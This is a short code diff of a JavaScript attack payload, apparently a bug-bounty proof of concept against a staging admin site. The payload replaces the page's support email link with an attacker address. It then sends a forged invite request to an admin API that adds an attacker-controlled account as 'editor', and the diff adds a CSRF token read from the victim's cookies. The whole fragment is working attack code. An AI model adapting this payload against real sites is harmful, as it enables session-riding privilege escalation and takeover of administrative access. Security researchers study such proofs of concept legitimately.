@@ -5,7 +5,8 @@ document.getElementById('support_email').href="mailto:badguy@badguy.com";
 let url = "https://adminbc.tsec-stg.com/api/v1/admins/send-invite";
 let headers = {
     'Accept': 'application/json',
-    'Content-Type': 'application/json'
+    'Content-Type': 'application/json',
+    'X-Ts-Csrf': document.cookie['X-Ts-Csrf']
 };
 
 jsonObj={"email":"gtrf+badguy@bugcrowdninja.com", "role":"editor"}
